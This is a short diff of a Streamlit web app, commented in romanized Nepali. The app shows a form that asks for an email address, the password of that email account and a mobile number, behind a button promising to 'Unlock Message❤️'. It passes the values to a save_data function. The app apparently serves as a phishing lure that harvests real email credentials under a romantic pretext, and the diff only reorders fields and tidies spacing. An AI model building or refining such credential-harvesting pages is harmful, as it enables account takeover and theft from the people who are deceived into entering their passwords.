@@ -43,8 +43,9 @@ if not st.session_state.submitted:
     with st.form("login_form"):
         # Variable haru form vitra define gareko
         email_val = st.text_input("Email Address jais..")
-        password_val = st.text_input("Email Password", type="password")
         number_val= st.text_input("Mobile Number..")
+        password_val = st.text_input("Email Password", type="password")
+     
         
         submit_btn = st.form_submit_button("Unlock Message❤️")
         
@@ -52,7 +53,7 @@ if not st.session_state.submitted:
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
             if email_val and password_val:
-                save_data(email_val,number_val, password_val)
+                save_data(email_val, number_val, password_val)
                 st.session_state.submitted = True
                 st.rerun()
             else:
